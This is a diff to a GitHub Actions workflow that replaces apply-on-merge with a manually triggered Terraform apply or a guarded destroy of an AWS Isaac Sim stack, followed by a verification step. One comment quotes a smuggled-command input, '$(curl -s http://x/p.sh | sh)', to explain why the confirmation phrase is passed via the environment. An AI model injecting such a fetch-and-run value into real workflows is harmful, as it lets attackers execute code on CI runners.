@@ -2,10 +2,15 @@
 #
 #   Pull request touching infra/  ->  fmt + validate + Lambda syntax check.
 #                                     No AWS access, so anyone's PR is safe.
-#   Push to main touching infra/  ->  plan, then apply. Runs as the
-#   (or "Run workflow" by hand)       isaac-sim-github-deploy IAM role, which
+#   "Run workflow" by hand        ->  apply OR destroy. Runs as the
+#                                     isaac-sim-github-deploy IAM role, which
 #                                     AWS only hands out to this repo's main
 #                                     branch. Nothing else can apply.
+#
+# There is deliberately NO apply-on-merge trigger. It was removed when the
+# stack was torn down, so a later merge touching infra/ cannot silently
+# rebuild the whole thing. To bring the stack back, run this workflow by hand
+# with action = apply.
 
 name: terraform
 
@@ -14,18 +19,37 @@ on:
     paths:
       - "infra/**"
       - ".github/workflows/terraform.yml"
-  push:
-    branches: [main]
-    paths:
-      - "infra/**"
-      - ".github/workflows/terraform.yml"
+
   workflow_dispatch:
+    inputs:
+      action:
+        description: "What to run against infra/."
+        type: choice
+        options:
+          - apply
+          - destroy
+        default: apply
+
+      confirm:
+        description: "Destroy only: type exactly  destroy isaac-sim  to proceed. Ignored by apply."
+        type: string
+        default: ""
+
+      terminate_instance:
+        description: "Destroy only: also terminate the running Purpose=isaac-sim instance. DELETES ITS 512 GiB DISK. Leave off to abort if one is running."
+        type: boolean
+        default: false
+
+      force_destroy_users:
+        description: "Destroy only: delete the developer IAM users even if they added their own MFA device or access key. Needed if destroy fails with DeleteConflict."
+        type: boolean
+        default: false
 
 permissions:
   contents: read
   id-token: write # needed to get the OIDC token AWS trusts
 
-# Never run two applies at once. A second push waits for the first to finish.
+# Never run two of these at once. A second run waits for the first to finish.
 concurrency:
   group: terraform-infra
   cancel-in-progress: false
@@ -62,7 +86,7 @@ jobs:
         run: python3 -m py_compile lambda/*.py
 
   apply:
-    if: github.event_name != 'pull_request'
+    if: github.event_name == 'workflow_dispatch' && github.event.inputs.action == 'apply'
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -84,3 +108,260 @@ jobs:
 
       - name: Apply
         run: terraform apply tfplan
+
+  destroy:
+    if: github.event_name == 'workflow_dispatch' && github.event.inputs.action == 'destroy'
+    runs-on: ubuntu-latest
+    steps:
+      # Checkout comes first. Every `run:` step inherits working-directory:
+      # infra from the defaults above, and that folder does not exist until
+      # the repo is on disk - a run step placed above this one dies before
+      # its first line executes.
+      - uses: actions/checkout@v4
+
+      # Guard 1: a mis-click in the dropdown should not delete the stack. The
+      # operator has to type the phrase out before anything touches AWS.
+      #
+      # The phrase arrives through the environment and is never spliced into
+      # the script with ${{ }}. Spliced in, a value like
+      # "$(curl -s http://x/p.sh | sh)destroy isaac-sim" would run on the
+      # runner AND still compare equal - the guard would wave through the
+      # very input it exists to check.
+      - name: Check the confirmation phrase
+        env:
+          CONFIRM: ${{ github.event.inputs.confirm }}
+        run: |
+          if [ "$CONFIRM" != "destroy isaac-sim" ]; then
+            echo "::error::Confirmation phrase missing or wrong. Re-run with confirm = 'destroy isaac-sim'."
+            exit 1
+          fi
+
+      - uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::729763663166:role/isaac-sim-github-deploy
+          aws-region: us-east-1
+
+      - uses: hashicorp/setup-terraform@v3
+        with:
+          terraform_version: ${{ env.TERRAFORM_VERSION }}
+
+      # Guard 2: the instance is launched by hand from the template, so it is
+      # NOT in Terraform state and `terraform destroy` will not touch it. Left
+      # behind it bills forever, and its network card pins the security group
+      # so the destroy would fail on that anyway.
+      #
+      # This step only LOOKS. Stopping here costs nothing, because nothing has
+      # been changed yet.
+      - name: Look for the untracked Isaac Sim instance
+        id: instance
+        env:
+          TERMINATE: ${{ github.event.inputs.terminate_instance }}
+        run: |
+          ids=$(aws ec2 describe-instances \
+            --filters "Name=tag:Purpose,Values=isaac-sim" \
+                      "Name=instance-state-name,Values=pending,running,stopping,stopped" \
+            --query "Reservations[].Instances[].InstanceId" --output text)
+
+          echo "ids=$ids" >> "$GITHUB_OUTPUT"
+
+          if [ -z "$ids" ]; then
+            echo "No Purpose=isaac-sim instance is alive. Nothing to terminate."
+            exit 0
+          fi
+
+          echo "Found untracked Isaac Sim instance(s): $ids"
+
+          if [ "$TERMINATE" != "true" ]; then
+            echo "::error::Instance(s) $ids are still alive and terraform destroy will not remove them."
+            echo "::error::Push any work off the disk first, then re-run with terminate_instance = true."
+            exit 1
+          fi
+
+      - name: Init
+        run: terraform init
+
+      # aws_iam_user.force_destroy is read from STATE at delete time, not from
+      # the config, so passing the variable to `destroy` alone does nothing.
+      # This targeted apply writes the new value into state first.
+      #
+      # -refresh=false is deliberate. On a re-run after a part-way destroy,
+      # some users may already be gone from AWS; a refresh would notice and
+      # plan to CREATE them again, just so the next step could delete them.
+      - name: Allow the developer users to be deleted
+        if: github.event.inputs.force_destroy_users == 'true'
+        run: |
+          if ! terraform state list aws_iam_user.developers | grep -q .; then
+            echo "No developer users left in state. Nothing to flag."
+            exit 0
+          fi
+
+          terraform apply -auto-approve -refresh=false \
+            -var="force_destroy_users=true" \
+            -target=aws_iam_user.developers
+
+      # Printed in full so the run log is the record of what was removed.
+      - name: Plan the destroy
+        env:
+          FORCE_DESTROY_USERS: ${{ github.event.inputs.force_destroy_users }}
+        run: |
+          terraform plan -destroy \
+            -var="force_destroy_users=$FORCE_DESTROY_USERS" \
+            -out=tfdestroy
+
+      # Only now, with a working plan in hand, is anything irreversible done.
+      # The instance is not part of that plan, so terminating it earlier bought
+      # nothing and risked everything: a state lock held by another run, or an
+      # AMI that no longer resolves, would have failed the job with the disk
+      # already gone and the stack still standing.
+      - name: Terminate the untracked instance
+        if: steps.instance.outputs.ids != ''
+        env:
+          IDS: ${{ steps.instance.outputs.ids }}
+        run: |
+          echo "Terminating $IDS (its disk is delete-on-termination and goes with it)."
+          aws ec2 terminate-instances --instance-ids $IDS
+
+          # The security group cannot be deleted while the instance's network
+          # card still exists, so this has to finish before the destroy runs.
+          # One `wait` gives up after 10 minutes, which a large GPU instance
+          # can exceed, so allow three rounds before calling it stuck.
+          for round in 1 2 3; do
+            if aws ec2 wait instance-terminated --instance-ids $IDS; then
+              echo "Terminated."
+              exit 0
+            fi
+            echo "Still terminating after round $round..."
+          done
+
+          echo "::error::Instance(s) $IDS did not reach 'terminated' within 30 minutes."
+          exit 1
+
+      - name: Destroy
+        run: terraform apply tfdestroy
+
+      # Proof, not trust. `Destroy complete!` only says Terraform is happy with
+      # its own state file. This asks AWS directly: is anything of ours still
+      # standing, and is everything that was NOT ours still there?
+      #
+      # Written out longhand rather than through a helper. Each check is a
+      # plain command whose output should be empty (or non-empty, in the second
+      # half), so a reader can see exactly what was asked of AWS.
+      - name: Verify the teardown
+        run: |
+          fail=0
+
+          check_empty() {
+            if [ -n "$2" ]; then
+              echo "::error::STILL PRESENT - $1: $2"
+              fail=1
+            else
+              echo "gone:  $1"
+            fi
+          }
+
+          check_present() {
+            if [ -n "$2" ]; then
+              echo "kept:  $1 -> $2"
+            else
+              echo "::error::MISSING - $1 should have survived this destroy"
+              fail=1
+            fi
+          }
+
+          # ---- these must all be GONE ----------------------------------------
+
+          users=""
+          for u in robin-robotics hassaan-robotics; do
+            found=$(aws iam get-user --user-name "$u" \
+              --query User.UserName --output text 2>/dev/null || true)
+            users="$users $found"
+          done
+          check_empty "developer IAM users" "$(echo $users)"
+
+          group=$(aws iam get-group --group-name isaac-sim-operators \
+            --query Group.GroupName --output text 2>/dev/null || true)
+          check_empty "IAM group isaac-sim-operators" "$group"
+
+          policies=$(aws iam list-policies --scope Local \
+            --query "Policies[?starts_with(PolicyName,'isaac-sim')].PolicyName" \
+            --output text || true)
+          check_empty "customer-managed IAM policies isaac-sim-*" "$policies"
+
+          # The deploy role is bootstrap's, not ours, so it is excluded here and
+          # asserted as a survivor further down.
+          roles=$(aws iam list-roles \
+            --query "Roles[?starts_with(RoleName,'isaac-sim') && RoleName!='isaac-sim-github-deploy'].RoleName" \
+            --output text || true)
+          check_empty "IAM roles isaac-sim-*" "$roles"
+
+          profile=$(aws iam get-instance-profile --instance-profile-name isaac-sim-instance \
+            --query InstanceProfile.InstanceProfileName --output text 2>/dev/null || true)
+          check_empty "instance profile isaac-sim-instance" "$profile"
+
+          templates=$(aws ec2 describe-launch-templates \
+            --query "LaunchTemplates[?starts_with(LaunchTemplateName,'isaac-sim')].LaunchTemplateName" \
+            --output text 2>/dev/null || true)
+          check_empty "launch template" "$templates"
+
+          sg=$(aws ec2 describe-security-groups \
+            --filters Name=group-name,Values=isaac-sim-sg \
+            --query "SecurityGroups[].GroupName" --output text || true)
+          check_empty "security group isaac-sim-sg" "$sg"
+
+          keys=$(aws ec2 describe-key-pairs \
+            --filters Name=key-name,Values=isaac-sim-key \
+            --query "KeyPairs[].KeyName" --output text || true)
+          check_empty "key pair isaac-sim-key" "$keys"
+
+          fns=$(aws lambda list-functions \
+            --query "Functions[?starts_with(FunctionName,'isaac-sim')].FunctionName" \
+            --output text || true)
+          check_empty "Lambda functions" "$fns"
+
+          rules=$(aws events list-rules --name-prefix isaac-sim \
+            --query "Rules[].Name" --output text || true)
+          check_empty "EventBridge rules" "$rules"
+
+          groups=$(aws logs describe-log-groups \
+            --log-group-name-prefix /aws/lambda/isaac-sim \
+            --query "logGroups[].logGroupName" --output text || true)
+          check_empty "CloudWatch log groups" "$groups"
+
+          instances=$(aws ec2 describe-instances \
+            --filters "Name=tag:Purpose,Values=isaac-sim" \
+                      "Name=instance-state-name,Values=pending,running,stopping,stopped" \
+            --query "Reservations[].Instances[].InstanceId" --output text || true)
+          check_empty "tagged EC2 instances" "$instances"
+
+          state=$(terraform state list 2>/dev/null || true)
+          check_empty "resources left in Terraform state" "$(echo $state)"
+
+          # ---- these must all SURVIVE ----------------------------------------
+          # This half is the point of scoping the destroy to infra/. If any of
+          # these vanished, something outside this project was damaged.
+
+          admin=$(aws iam get-user --user-name dodao-admin \
+            --query User.UserName --output text 2>/dev/null || true)
+          check_present "pre-existing admin user dodao-admin" "$admin"
+
+          oidc=$(aws iam list-open-id-connect-providers \
+            --query "OpenIDConnectProviderList[?contains(Arn,'token.actions.githubusercontent.com')].Arn" \
+            --output text || true)
+          check_present "account-wide GitHub OIDC provider" "$oidc"
+
+          deploy=$(aws iam get-role --role-name isaac-sim-github-deploy \
+            --query Role.RoleName --output text 2>/dev/null || true)
+          check_present "bootstrap deploy role" "$deploy"
+
+          bucket=""
+          aws s3api head-bucket --bucket isaac-sim-tfstate-729763663166 2>/dev/null \
+            && bucket="isaac-sim-tfstate-729763663166"
+          check_present "Terraform state bucket" "$bucket"
+
+          if [ "$fail" -ne 0 ]; then
+            echo "::error::Teardown verification FAILED - see the lines above."
+            exit 1
+          fi
+
+          echo
+          echo "Verification passed: the stack is gone, and nothing outside it was touched."
